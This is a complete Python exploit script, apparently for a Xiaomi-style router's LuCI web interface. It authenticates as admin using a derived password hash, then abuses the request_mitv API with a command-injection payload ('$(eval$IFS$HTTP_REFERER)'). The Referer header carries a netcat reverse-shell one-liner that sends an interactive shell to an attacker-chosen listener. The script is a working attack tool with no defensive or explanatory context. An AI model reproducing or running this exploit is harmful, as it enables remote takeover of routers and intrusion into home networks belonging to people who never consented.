import sys
import requests
import hashlib
import time
import random
def createnonce(mac):
    return f'0_{mac}_{int(time.time())}_{random.randint(0,9999)}'
def oldPwd(pwd, nonce):
    key = 'a2ffa5c9be07488bbb04a3a47d3c5f6a'
    return hashlib.sha1(f"{nonce}{hashlib.sha1((pwd+key).encode()).hexdigest()}".encode()).hexdigest()
def doLogin(ip, deviceId, pwd):
    url = f"http://{ip}/cgi-bin/luci/api/xqsystem/login"
    nonce = createnonce(deviceId)
    data = {"username": "admin", "password": oldPwd(pwd, nonce), "logtype": "2", "nonce": nonce}
    try:
        resp = requests.post(url, data=data, timeout=60)
        return resp.json()['token']
    except requests.exceptions.RequestException as e:
        print(f"Login failed: {e}")
        sys.exit(1)
def genDeviceId():
    return ":".join(f"{random.randint(0,99):02d}" for _ in range(6))
def request_mitv(ip, lip, lport, tok):
    url = f"http://{ip}/cgi-bin/luci/;stok={tok}/api/xqsmarthome/request_mitv"
    payload = {"payload": '{"ip":"127.0.0.1","command":"video_playurl","url":"$(eval$IFS$HTTP_REFERER)"}'}
    headers = {"Referer": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/ash -i 2>&1|nc {lip} {lport} >/tmp/f"}
    try:
        requests.post(url, data=payload, headers=headers, timeout=10)
    except requests.exceptions.Timeout:
        print("Payload delivered (timeout expected)")
def main():
    if len(sys.argv) !=5:
        print("Usage: exp.py wifipwd ipaddress lip lport")
        return
    wifipwd, ip, lip, lport = sys.argv[1:5]
    print("[+] Starting exploit...")
    token = doLogin(ip, genDeviceId(), wifipwd)
    print(f"[+] Obtained token: {token}")
    time.sleep(2)
    request_mitv(ip, lip, lport, token)
    print("[+] Exploit payload sent. Check your listener.")
if __name__ == '__main__':
    main()
